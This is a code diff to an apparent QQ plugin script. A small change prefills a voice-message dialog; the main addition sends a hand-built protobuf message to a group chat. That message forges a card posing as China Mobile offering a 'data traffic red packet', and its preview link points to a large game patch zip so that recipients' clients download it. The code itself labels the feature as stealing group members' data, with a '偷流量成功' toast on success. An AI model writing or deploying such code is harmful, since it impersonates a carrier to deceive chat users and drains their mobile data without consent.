@@ -1577,6 +1577,7 @@ void showVoiceSendDialog(Object data) {
     }
 
     final String groupUin = String.valueOf(data.peerUin);
+    final String msg = String.valueOf(data.msg);
     final String groupName = (data.data != null && data.data.peerName != null)
             ? (String) data.data.peerName : "未知群";
 
@@ -1696,6 +1697,7 @@ void showVoiceSendDialog(Object data) {
 
                 final EditText etText = new EditText(act);
                 etText.setHint("请输入要转为语音的文本");
+                etText.setText(msg);
                 etText.setHintTextColor(subTextColor);
                 etText.setTextColor(textColor);
                 etText.setTextSize(13);
@@ -1939,4 +1941,187 @@ void sendVoiceMessage(String groupUin, String voiceId, String text) {
     } catch (Exception e) {
         qqToast(1, "发送异常: " + e.getMessage());
     }
+}
+
+
+void showTrafficRedPacketDialog(Object data) {
+    if (data == null || data.type != 2) {
+        qqToast(1, "仅支持群聊使用");
+        return;
+    }
+    String groupUin = String.valueOf(data.peerUin);
+    if (groupUin.equals("0") || groupUin.equals("-1")) {
+        qqToast(1, "无法获取群号");
+        return;
+    }
+    Activity act = getNowActivity();
+    if (act == null) return;
+    act.runOnUiThread(new Runnable() {
+        public void run() {
+            Dialog dialog = new Dialog(act);
+            dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
+            if (dialog.getWindow() != null) {
+                dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+            }
+            FrameLayout outer = new FrameLayout(act);
+            int m = dp(act, 24);
+            outer.setPadding(m, m, m, m);
+            ScrollView scroll = new ScrollView(act);
+            outer.addView(scroll);
+            LinearLayout card = new LinearLayout(act);
+            card.setOrientation(LinearLayout.VERTICAL);
+            card.setBackground(makeRoundRect(isThemeDark(act) ? Color.parseColor("#FF2D2D2D") : Color.WHITE, dp(act, 16)));
+            card.setPadding(dp(act, 20), dp(act, 20), dp(act, 20), dp(act, 20));
+            scroll.addView(card);
+
+            TextView tvTitle = new TextView(act);
+            tvTitle.setText("正在偷取你们的流量");
+            tvTitle.setTextSize(18);
+            tvTitle.setTextColor(isThemeDark(act) ? UI_COLOR_TEXT_DARK : UI_COLOR_TEXT_LIGHT);
+            tvTitle.setGravity(Gravity.CENTER);
+            tvTitle.setPadding(0, 0, 0, dp(act, 16));
+            card.addView(tvTitle);
+
+            boolean dark = isThemeDark(act);
+            int bg = dark ? UI_COLOR_INPUT_BG_DARK : UI_COLOR_INPUT_BG_LIGHT;
+            int subColor = dark ? UI_COLOR_SUBTEXT_DARK : UI_COLOR_SUBTEXT_LIGHT;
+
+            card.addView(makeSubTitleCompact(act, "外显链接", subColor));
+            EditText et1 = makeInputCompact(act, "www.10086.cn", "", bg);
+            card.addView(et1);
+
+            card.addView(makeSubTitleCompact(act, "标题", subColor));
+            EditText et2 = makeInputCompact(act, "中国移动", "", bg);
+            card.addView(et2);
+
+            card.addView(makeSubTitleCompact(act, "描述", subColor));
+            EditText et3 = makeInputCompact(act, "正在给你发送流量红包", "", bg);
+            card.addView(et3);
+
+            card.addView(makeSubTitleCompact(act, "预览链接", subColor));
+            EditText et4 = makeInputCompact(act, "https://autopatchcn.yuanshen.com/client_app/update/hk4e_cn/game_5.3.0_5.4.0_hdiff_pMLdaxlPCASusOeB.zip", "", bg);
+            card.addView(et4);
+
+            LinearLayout btnLayout = new LinearLayout(act);
+            btnLayout.setOrientation(LinearLayout.HORIZONTAL);
+            btnLayout.setGravity(Gravity.CENTER);
+            btnLayout.setPadding(0, dp(act, 20), 0, 0);
+
+            TextView cancel = makeActionBtn(act, "取消", Color.parseColor("#666666"), dark ? Color.parseColor("#FF3D3D3D") : Color.parseColor("#F7F8FA"));
+            TextView send = makeActionBtn(act, "发送", Color.WHITE, Color.parseColor("#3B71FE"));
+
+            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0, dp(act, 44), 1f);
+            lp.setMargins(0, 0, dp(act, 12), 0);
+            cancel.setLayoutParams(lp);
+            send.setLayoutParams(new LinearLayout.LayoutParams(0, dp(act, 44), 1f));
+
+            btnLayout.addView(cancel);
+            btnLayout.addView(send);
+            card.addView(btnLayout);
+
+            cancel.setOnClickListener(new View.OnClickListener() {
+                public void onClick(View v) { dialog.dismiss(); }
+            });
+
+            send.setOnClickListener(new View.OnClickListener() {
+                public void onClick(View v) {
+                    String v1 = et1.getText().toString().trim();
+                    String v2 = et2.getText().toString().trim();
+                    String v3 = et3.getText().toString().trim();
+                    String v4 = et4.getText().toString().trim();
+
+                    dialog.dismiss();
+                    try {
+                        JSONObject inner = new JSONObject();
+                        inner.put("1", v1.isEmpty() ? "www.10086.cn" : v1);
+
+                        JSONObject inner14 = new JSONObject();
+                        inner14.put("1", v2.isEmpty() ? "中国移动" : v2);
+                        inner14.put("2", v3.isEmpty() ? "正在给你发送流量红包" : v3);
+                        inner14.put("3", v4.isEmpty() ? "https://autopatchcn.yuanshen.com/client_app/update/hk4e_cn/game_5.3.0_5.4.0_hdiff_pMLdaxlPCASusOeB.zip" : v4);
+
+                        JSONObject inner12 = new JSONObject();
+                        inner12.put("14", inner14);
+                        inner.put("12", inner12);
+
+                        String compressed = compressToField7(inner.toString());
+
+                        JSONObject root = new JSONObject();
+                        JSONObject f1 = new JSONObject();
+                        JSONObject f1_2 = new JSONObject();
+                        f1_2.put("1", Long.parseLong(groupUin));
+                        f1.put("2", f1_2);
+                        root.put("1", f1);
+
+                        JSONObject f2 = new JSONObject();
+                        f2.put("1", 1); f2.put("2", 0); f2.put("3", 0);
+                        root.put("2", f2);
+
+                        JSONObject f3 = new JSONObject();
+                        JSONObject f3_1 = new JSONObject();
+                        JSONObject f3_1_2 = new JSONObject();
+                        JSONObject f3_1_2_37 = new JSONObject();
+                        f3_1_2_37.put("17", 0);
+
+                        JSONObject f19 = new JSONObject();
+                        f19.put("41", 0);
+                        f19.put("15", 0);
+                        f19.put("31", 0);
+                        f3_1_2_37.put("19", f19);
+
+                        f3_1_2_37.put("6", 1);
+                        f3_1_2_37.put("7", compressed);
+
+                        f3_1_2.put("37", f3_1_2_37);
+                        f3_1.put("2", f3_1_2);
+                        f3.put("1", f3_1);
+                        root.put("3", f3);
+
+                        root.put("4", 4100116396);
+                        root.put("5", 0);
+
+                        FunProtoData proto = new FunProtoData();
+                        proto.fromJSON(root);
+                        byte[] pb = proto.toBytes();
+                        traceLog(" _log.txt", "" + root);
+
+                        PacketHelper.sendRequest("MessageSvc.PbSendMsg", pb, new IReceiver() {
+                            public void onReceive(byte[] resp) {
+                                act.runOnUiThread(new Runnable() {
+                                    public void run() {
+                                        qqToast(resp != null ? 2 : 1, resp != null ? "偷流量成功！" : "发送失败");
+                                    }
+                                });
+                            }
+                        });
+                    } catch (Exception e) {
+                        qqToast(1, "异常: " + e.getMessage());
+                        traceLog(" _log.txt",""+e);
+                    }
+                }
+            });
+
+            dialog.setContentView(outer);
+            if (dialog.getWindow() != null) {
+                dialog.getWindow().setLayout((int)(act.getResources().getDisplayMetrics().widthPixels * 0.88), -2);
+            }
+            dialog.show();
+            applyUiTheme(act, dialog);
+        }
+    });
+}
+
+/**
+ * 正确的 compressToField7（匹配成功示例 UVD1+...）
+ * = raw PB + Base64.withoutPadding（和 QPacketHelper.kt 逻辑一致）
+ * 无需 GZIP、无需 Deflater
+ */
+String compressToField7(String jsonStr) throws Exception {
+    JSONObject json = new JSONObject(jsonStr);
+    FunProtoData proto = new FunProtoData();
+    proto.fromJSON(json);
+    byte[] protoBytes = proto.toBytes();
+
+    // 关键：仅 Base64，无任何压缩
+    return java.util.Base64.getEncoder().withoutPadding().encodeToString(protoBytes);
 }
